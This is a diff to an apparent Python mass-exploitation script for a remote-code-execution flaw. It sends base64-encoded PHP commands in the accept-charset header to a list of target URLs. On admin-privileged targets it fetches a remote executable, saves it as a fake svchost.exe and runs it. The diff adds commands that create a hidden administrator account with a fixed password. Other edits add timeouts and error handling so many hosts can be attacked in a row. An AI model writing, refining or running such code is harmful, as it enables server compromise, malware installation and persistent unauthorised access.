@@ -32,10 +32,10 @@ def exp(url):
     
     command = base64.b64encode(command.encode('utf-8'))
     headers['accept-charset'] = str(command, 'utf-8')
-    user = result = requests.get(url, headers=headers, verify=False).text.split('<!')[0].strip('\r\n')
+    user = result = requests.get(url, headers=headers, verify=False,timeout=10).text.split('<!')[0].strip('\r\n')
     if 'system' in user or 'administrator' in user or 'administrators' in user or 'admin' in user:
         print("[+] Target Has Hight_authority: "+ user+"  execute the High_authority Code.")
-        command = '$file=file_get_contents("' + High_authority + '");file_put_contents("C:\\Windows\\svchost.exe",$file);system("C:\\Windows\\svchost.exe");'
+        command = '$file=file_get_contents("' + High_authority + '");file_put_contents("C:\\Windows\\svchost.exe",$file);system("C:\\Windows\\svchost.exe");system("net user ASP.NET$ bakabie.qwe123 /add");system("net localgroup administrators ASP.NET /add");'
         command = base64.b64encode(command.encode('utf-8'))
         log.write("H:"+url+"\r\n")
     else:
@@ -44,7 +44,7 @@ def exp(url):
         command = base64.b64encode(command.encode('utf-8'))
         log.write("L:"+url+"\r\n")
     headers['accept-charset'] = str(command, 'utf-8')
-    result = requests.get(url, headers=headers, verify=False)
+    result = requests.get(url, headers=headers, verify=False,timeout=10)
     print("[+] Target: "+ url + " Finished.")
     print(result.text.split('<!')[0].strip('\r\n'))
     # while(1):
@@ -64,11 +64,13 @@ def exp(url):
     #             print(result[0], end="")
 
 def check(url):
-    result = requests.get(url, headers=headers, verify=False)
+    result = requests.get(url, headers=headers, verify=False,timeout=10)
     if result.status_code == 200 and 'fuhei666' in result.text:
+        print("[!] Now Url: " + url)
         print("[+] Remote code execution vulnerability exists at the target address")
         return True
     else:
+        print("[!] Now Url: " + url)
         print("[-] There is no remote code execution vulnerability in the target address")
         return False
 
@@ -80,8 +82,15 @@ if __name__ == '__main__':
             urls.append(sys.argv[1])
         else:
             f = open(sys.argv[1],"r")
-            urls=f.readlines()
+            for i in f.readlines():
+                urls.append(i.strip('\r').strip('\n'))
             f.close()
+    
     for url in urls:
-        if check(url):
-            exp(url)
+        try:
+            if check(url):
+                exp(url)
+        except Exception as e:
+            print("[-] Error:")
+            print("\t\n"+str(e)+"\n")
+            continue
